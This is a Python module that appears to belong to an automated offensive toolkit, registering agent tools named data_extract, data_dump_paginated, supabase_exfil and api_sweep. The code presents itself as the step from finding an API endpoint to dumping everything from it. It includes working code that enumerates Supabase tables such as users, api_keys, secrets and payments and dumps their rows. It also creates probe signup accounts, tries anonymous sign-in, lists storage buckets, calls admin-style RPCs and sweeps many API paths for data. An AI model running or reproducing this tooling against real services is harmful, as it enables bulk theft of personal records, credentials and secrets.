"""TOOL: data_exfil - authenticated data extraction & exfiltration from discovered APIs.

Fills the gap between 'I found an endpoint' and 'I dumped everything from it'.
Supports custom auth headers, pagination, POST bodies, and full response capture.
"""
import json, urllib.request, urllib.error, urllib.parse, time, re
from tools import register

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def _http(url, method="GET", headers=None, body=None, timeout=25,
          content_type=None, _redirects=0):
    """Raw HTTP with full response capture.  Follows 307/308, captures
    Set-Cookie, and supports json / form / raw body encoding.

    content_type: "json" (default) | "form" | "raw"
      json  → dict/list JSON-encoded, Content-Type: application/json
      form  → dict url-encoded, str sent raw; Content-Type: x-www-form-urlencoded
      raw   → body sent as-is, no Content-Type override
    """
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    rq = urllib.request.Request(url, method=method, headers=h)
    data = None
    if body is not None:
        ct = (content_type or "json").lower()
        if ct == "form":
            if isinstance(body, dict):
                data = urllib.parse.urlencode(body).encode()
            elif isinstance(body, str):
                data = body.encode()
            else:
                data = str(body).encode()
            if "Content-Type" not in h and "content-type" not in h:
                rq.add_header("Content-Type", "application/x-www-form-urlencoded")
        elif ct == "raw":
            data = body.encode() if isinstance(body, str) else body
        else:  # json (default)
            data = json.dumps(body).encode() if isinstance(body, (dict, list)) else body.encode()
            if "Content-Type" not in h and "content-type" not in h:
                rq.add_header("Content-Type", "application/json")
    try:
        r = urllib.request.urlopen(rq, data=data, timeout=timeout)
        resp_hdrs = dict(r.headers) if hasattr(r, "headers") else {}
        cookies = r.headers.get_all("Set-Cookie") if hasattr(r.headers, "get_all") else []
        raw = r.read().decode(errors="replace")
        return {"status": r.status, "body": raw, "headers": resp_hdrs,
                "cookies": cookies or [],
                "size": len(raw), "final_url": r.geturl()}
    except urllib.error.HTTPError as ex:
        loc = ex.headers.get("Location") if ex.code in (301, 302, 303, 307, 308) else None
        if loc and _redirects < 3:
            nxt = urllib.parse.urljoin(url, loc)
            m2 = "GET" if ex.code in (301, 302, 303) else method
            res = _http(nxt, method=m2, headers=headers, body=body,
                        content_type=content_type,
                        timeout=timeout, _redirects=_redirects + 1)
            res["redirected_from"] = url
            res["redirect_status"] = ex.code
            return res
        resp_hdrs = dict(ex.headers) if hasattr(ex, "headers") else {}
        cookies = ex.headers.get_all("Set-Cookie") if hasattr(ex.headers, "get_all") else []
        try:
            raw = ex.read().decode(errors="replace")
        except Exception:
            # R5-11: reset pendant la lecture du body — la réponse cible
            # (status réel) reste authentique, body vide par défaut
            raw = ""
        return {"status": ex.code, "body": raw, "headers": resp_hdrs,
                "cookies": cookies or [],
                "size": len(raw), "final_url": url}
    except Exception as ex:
        return {"status": -1, "body": f"{type(ex).__name__}: {str(ex)[:200]}",
                "headers": {}, "cookies": [], "size": 0, "final_url": url}


# ─────────────────────────────────────────────────────────
# 1. GENERIC DATA EXTRACTION — hit any URL with any auth
# ─────────────────────────────────────────────────────────
@register(name="data_extract",
          desc="Make an authenticated HTTP request and return FULL response body (up to 60KB, "
               "raise truncate_at for larger captures) "
               "plus response headers and Set-Cookie. "
               "Supports GET/POST, custom headers, POST body as JSON or form-urlencoded. "
               "Set content_type='form' for form endpoints (FastAPI Form fields, login pages).",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "Full URL to fetch"},
              "method": {"type": "string", "description": "GET or POST (default: GET)"},
              "headers": {"type": "object", "description": "Custom headers dict, e.g. {\"Authorization\": \"Bearer xxx\", \"Cookie\": \"session=abc\"}"},
              "body": {"description": "POST body — dict for JSON/form encoding, string for raw 'key=val&key2=val2'"},
              "content_type": {"type": "string", "description": "Body encoding: 'json' (default), 'form' (url-encoded), 'raw' (as-is)"},
              "truncate_at": {"type": "integer", "description": "Response body capture cap in bytes (default 60000 — W10: 15KB truncated checkout HTML mid-RSC-payload)"}},
              "required": ["url"]})
def data_extract(url, method="GET", headers=None, body=None, content_type=None,
                 truncate_at=60000):
    truncate_at = max(2000, min(int(truncate_at or 60000), 200000))
    r = _http(url, method=method, headers=headers, body=body,
              content_type=content_type, timeout=30)
    # Try to parse as JSON for pretty output
    parsed = None
    try:
        parsed = json.loads(r["body"])
    except Exception:
        pass

    out = {
        "url": url,
        "status": r["status"],
        "size": r["size"],
        "content_type": r["headers"].get("Content-Type", r["headers"].get("content-type", "unknown")),
    }
    # Surface Set-Cookie headers — critical for session capture
    if r.get("cookies"):
        out["set_cookie"] = r["cookies"]
    # Surface security-relevant response headers
    resp_sec = {}
    for hk in ("Location", "X-Request-Id", "X-Powered-By", "Server",
                "WWW-Authenticate", "Access-Control-Allow-Origin"):
        val = r["headers"].get(hk) or r["headers"].get(hk.lower())
        if val:
            resp_sec[hk] = val
    if resp_sec:
        out["response_headers"] = resp_sec
    if r.get("redirected_from") or r.get("final_url", url) != url:
        out["redirected_to"] = r.get("final_url", "")
        out["redirect_status"] = r.get("redirect_status")
    if parsed is not None:
        out["json"] = parsed if len(json.dumps(parsed)) < truncate_at else str(parsed)[:truncate_at]
        out["record_count"] = len(parsed) if isinstance(parsed, list) else 1
    else:
        out["text"] = r["body"][:truncate_at]
    return json.dumps(out, ensure_ascii=False, indent=1)


# ─────────────────────────────────────────────────────────
# 2. PAGINATED DUMP — auto-paginate through REST APIs
# ─────────────────────────────────────────────────────────
@register(name="data_dump_paginated",
          desc="Paginated data extraction from REST APIs. Auto-iterates offset/limit or page params. "
               "Use to dump entire database tables, product lists, user lists, etc. "
               "Stops when empty response or max_pages reached.",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "Base URL (without pagination params)"},
              "headers": {"type": "object", "description": "Auth headers dict"},
              "page_size": {"type": "integer", "description": "Records per page (default: 50)"},
              "max_pages": {"type": "integer", "description": "Max pages to fetch (default: 10)"},
              "page_style": {"type": "string", "description": "offset (default) | page | cursor"},
              "body": {"type": "object", "description": "POST body template (optional)"}},
              "required": ["url"]})
def data_dump_paginated(url, headers=None, page_size=50, max_pages=10, page_style="offset", body=None):
    # clamps ROE (R5-16): LA seule boucle non bornée de la flotte doit le rester
    max_pages = max(1, min(int(max_pages or 10), 200))
    page_size = max(1, min(int(page_size or 50), 500))
    all_records = []
    pages_fetched = 0
    prev_page = None       # C-DX1: détection « aucun progrès » par CONTENU
    records_capped = False
    method = "POST" if body else "GET"

    for page in range(max_pages):
        # Build paginated URL
        sep = "&" if "?" in url else "?"
        if page_style == "offset":
            paged_url = f"{url}{sep}limit={page_size}&offset={page * page_size}"
        elif page_style == "page":
            paged_url = f"{url}{sep}limit={page_size}&page={page + 1}"
        else:
            paged_url = f"{url}{sep}limit={page_size}&offset={page * page_size}"

        r = _http(paged_url, method=method, headers=headers, body=body, timeout=25)
        pages_fetched += 1

        if r["status"] != 200:
            all_records.append({"_page": page + 1, "_error": r["status"], "_body": r["body"][:500]})
            break

        try:
            data = json.loads(r["body"])
        except Exception:
            all_records.append({"_page": page + 1, "_raw": r["body"][:2000]})
            break

        if isinstance(data, list):
            # C-DX1: stop = page VIDE ou aucun progrès (contenu identique au
            # précédent — serveur qui ignore l'offset). L'ancien
            # `len(data) < page_size` lisait « dernière page » sur tout
            # serveur qui clampe la taille de page → dumps silencieusement
            # incomplets. Deux pages PLEINES consécutives (longueurs égales)
            # restent légitimes → jamais de stop sur la longueur seule.
            if len(data) == 0 or data == prev_page:
                break
            all_records.extend(data)
            prev_page = data
        elif isinstance(data, dict):
            # Handle wrapped responses {data: [...], total: N}
            items = data.get("data") or data.get("results") or data.get("items") or data.get("records")
            if isinstance(items, list):
                if len(items) == 0 or items == prev_page:
                    break  # vide = fin réelle ; identique = aucun progrès
                all_records.extend(items)
                prev_page = items
            else:
                all_records.append(data)
                break  # Single object, no pagination
        else:
            all_records.append({"_page": page + 1, "_raw": str(data)[:2000]})
            break

        if len(all_records) >= 500:  # cap existant des records rendus
            records_capped = True
            break
        time.sleep(0.3)

    out = {
        "url": url,
        "pages_fetched": pages_fetched,
        "total_records": len(all_records),
        "records_capped": records_capped,
        "records": all_records[:500],  # Cap at 500 records
    }
    result = json.dumps(out, ensure_ascii=False, indent=1)
    return result[:20000]


# ─────────────────────────────────────────────────────────
# 3. SUPABASE TABLE ENUM + DUMP — specifically for Supabase
# ─────────────────────────────────────────────────────────
@register(name="supabase_exfil",
          desc="Enumerate and dump Supabase tables using anon key or JWT. "
               "Probes common table names, then dumps accessible ones with full data. "
               "Also tests RPC functions, auth endpoints, and storage buckets.",
          params={"type": "object", "properties": {
              "project_ref": {"type": "string", "description": "Supabase project ref (20-char string) OR full URL"},
              "anon_key": {"type": "string", "description": "Supabase anon/service key (JWT)"},
              "extra_tables": {"type": "array", "items": {"type": "string"}, "description": "Additional table names to probe"},
              "token": {"type": "string", "description": "User JWT if minted via signup"}},
              "required": ["project_ref", "anon_key"]})
def supabase_exfil(project_ref, anon_key, extra_tables=None, token=None):
    # Resolve base URL
    if project_ref.startswith("http"):
        base = project_ref.rstrip("/")
    else:
        base = f"https://{project_ref}.supabase.co"

    auth_headers = {"apikey": anon_key, "Authorization": f"Bearer {token or anon_key}"}
    report = {"base": base, "phases": {}}

    # ── Phase 1: Table enumeration ──
    default_tables = [
        "profiles", "users", "products", "orders", "categories", "payments",
        "subscriptions", "messages", "threads", "comments", "posts",
        "settings", "configs", "api_keys", "tokens", "sessions",
        "user_roles", "permissions", "audit_log", "notifications",
        "files", "uploads", "media", "images", "documents",
        "prices", "plans", "coupons", "promo_codes", "discounts",
        "contacts", "leads", "customers", "invoices", "transactions",
        "freebies", "downloads", "licenses", "vault_items", "secrets",
        "binsites", "tools_public", "pro_methods", "profiles_public",
    ]
    if extra_tables:
        default_tables.extend(extra_tables)
    # Deduplicate
    default_tables = list(dict.fromkeys(default_tables))

    table_results = []
    accessible_tables = []

    for t in default_tables:
        url = f"{base}/rest/v1/{t}?select=*&limit=3"
        r = _http(url, headers=auth_headers, timeout=12)
        entry = {"table": t, "status": r["status"]}

        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                entry["records"] = len(data) if isinstance(data, list) else 1
                entry["sample"] = data[:3] if isinstance(data, list) else data
                entry["verdict"] = "OPEN"
                accessible_tables.append(t)
            except Exception:
                entry["raw"] = r["body"][:300]
                entry["verdict"] = "OPEN-UNPARSED"
        elif r["status"] in (401, 403):
            entry["verdict"] = "LOCKED"
        elif r["status"] == 404:
            entry["verdict"] = "NOT-FOUND"
        else:
            entry["verdict"] = f"HTTP-{r['status']}"
            entry["detail"] = r["body"][:200]

        table_results.append(entry)
        time.sleep(0.15)

    report["phases"]["table_enum"] = {
        "probed": len(default_tables),
        "accessible": len(accessible_tables),
        "tables": table_results
    }

    # ── Phase 2: Deep dump of accessible tables ──
    full_dumps = {}
    for t in accessible_tables[:10]:  # Max 10 tables deep dump
        url = f"{base}/rest/v1/{t}?select=*&limit=100&order=id.asc"
        r = _http(url, headers=auth_headers, timeout=20)
        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                full_dumps[t] = {"count": len(data) if isinstance(data, list) else 1,
                                 "data": data[:100] if isinstance(data, list) else data}
            except Exception:
                full_dumps[t] = {"raw": r["body"][:3000]}

        # Also try COUNT
        url_count = f"{base}/rest/v1/{t}?select=count"
        rc = _http(url_count, headers={**auth_headers, "Prefer": "count=exact"}, timeout=10)
        if rc["status"] == 200:
            ct_hdr = rc["headers"].get("content-range", rc["headers"].get("Content-Range", ""))
            full_dumps.setdefault(t, {})["total_count"] = ct_hdr
        time.sleep(0.2)

    report["phases"]["data_dump"] = full_dumps

    # ── Phase 3: Auth probes ──
    auth_results = {}
    # Signup check
    r = _http(f"{base}/auth/v1/signup", method="POST", headers=auth_headers,
              body={"email": f"vf.probe.{int(time.time())}@proton.me", "password": "VfProbe!99zZ"}, timeout=15)
    auth_results["signup"] = {"status": r["status"], "body": r["body"][:300]}

    # Anonymous sign-in
    r = _http(f"{base}/auth/v1/anonymous-signin", method="POST", headers=auth_headers, body={}, timeout=10)
    auth_results["anon_signin"] = {"status": r["status"], "body": r["body"][:300]}

    # Settings
    r = _http(f"{base}/auth/v1/settings", headers=auth_headers, timeout=10)
    auth_results["settings"] = {"status": r["status"], "body": r["body"][:500]}

    report["phases"]["auth"] = auth_results

    # ── Phase 4: Storage buckets ──
    r = _http(f"{base}/storage/v1/bucket", headers=auth_headers, timeout=10)
    storage = {"list_status": r["status"]}
    if r["status"] == 200:
        try:
            storage["buckets"] = json.loads(r["body"])
        except Exception:
            storage["raw"] = r["body"][:500]
    report["phases"]["storage"] = storage

    # ── Phase 5: Common RPCs ──
    rpc_results = {}
    for rpc in ["get_registered_users_count", "get_pro_methods_count", "get_products_count",
                "get_orders_count", "get_total_revenue", "admin_stats", "get_stats",
                "get_user_count", "get_all_users", "search_users"]:
        r = _http(f"{base}/rest/v1/rpc/{rpc}", method="POST", headers=auth_headers, body={}, timeout=8)
        if r["status"] == 200:
            rpc_results[rpc] = {"status": 200, "data": r["body"][:300]}
        elif r["status"] in (401, 403):
            rpc_results[rpc] = {"status": r["status"], "verdict": "LOCKED"}
        # Skip 404s silently
        time.sleep(0.15)

    report["phases"]["rpcs"] = rpc_results

    result = json.dumps(report, ensure_ascii=False, indent=1)
    return result[:20000]


# ─────────────────────────────────────────────────────────
# 4. MULTI-ENDPOINT SWEEP — hit many paths, dump everything
# ─────────────────────────────────────────────────────────
@register(name="api_sweep",
          desc="Sweep multiple API paths against a base URL with auth headers, returning FULL response bodies. "
               "Unlike endpoint_oracle (status-only), this extracts actual data from every path.",
          params={"type": "object", "properties": {
              "base": {"type": "string", "description": "Base URL"},
              "paths": {"type": "array", "items": {"type": "string"}, "description": "List of paths to hit"},
              "headers": {"type": "object", "description": "Auth headers dict"},
              "method": {"type": "string", "description": "GET or POST (default: GET)"}},
              "required": ["base", "paths"]})
def api_sweep(base, paths, headers=None, method="GET"):
    results = []
    for p in paths[:30]:  # Cap at 30 paths
        url = base.rstrip("/") + "/" + p.lstrip("/")
        r = _http(url, method=method, headers=headers, timeout=15)
        entry = {"path": p, "status": r["status"], "size": r["size"]}
        if r.get("redirected_from") or r.get("final_url", url) != url:
            entry["redirected_to"] = r.get("final_url", "")

        # Method-gated backends reject GET with 404/405/307 while the function
        # actually exists: auto-probe POST before declaring anything missing.
        if method == "GET" and r["status"] in (404, 405, 307, 308):
            r2 = _http(url, method="POST", headers=headers, body={}, timeout=15)
            entry["post_probe"] = {"status": r2["status"], "size": r2["size"]}
            if r2["status"] in (200, 202):
                entry["verdict"] = f"OPEN-POST({r2['status']})"
                entry["data"] = r2["body"][:3000]
                entry["status"] = f"GET:{r['status']} -> POST:{r2['status']}"
                results.append(entry)
                time.sleep(0.2)
                continue
            if r2["status"] in (400, 401, 403, 422):
                entry["verdict"] = ("EXISTS-POST-LOCKED" if r2["status"] in (401, 403)
                                    else f"EXISTS-POST({r2['status']})")
                entry["status"] = f"GET:{r['status']} -> POST:{r2['status']}"
                results.append(entry)
                time.sleep(0.2)
                continue

        if r["status"] == 200:
            try:
                data = json.loads(r["body"])
                entry["json"] = data if len(r["body"]) < 5000 else str(data)[:5000]
                entry["record_count"] = len(data) if isinstance(data, list) else 1
            except Exception:
                entry["text"] = r["body"][:5000]
            entry["verdict"] = "OPEN"
        elif r["status"] in (301, 302, 307, 308):
            entry["verdict"] = f"REDIRECT({r['status']})"
            entry["detail"] = r["headers"].get("Location", r["body"][:120])
        elif r["status"] == 405:
            entry["verdict"] = "EXISTS-WRONG-METHOD"
            entry["detail"] = r["body"][:200]
        elif r["status"] == 202:
            entry["verdict"] = "OPEN-ASYNC"
            entry["detail"] = r["body"][:200]
        elif r["status"] in (401, 403):
            entry["verdict"] = "LOCKED"
            entry["detail"] = r["body"][:200]
        elif r["status"] == 404:
            entry["verdict"] = "missing"
        else:
            entry["verdict"] = f"HTTP-{r['status']}"
            entry["detail"] = r["body"][:200]

        results.append(entry)
        time.sleep(0.2)

    return json.dumps(results, ensure_ascii=False, indent=1)[:20000]
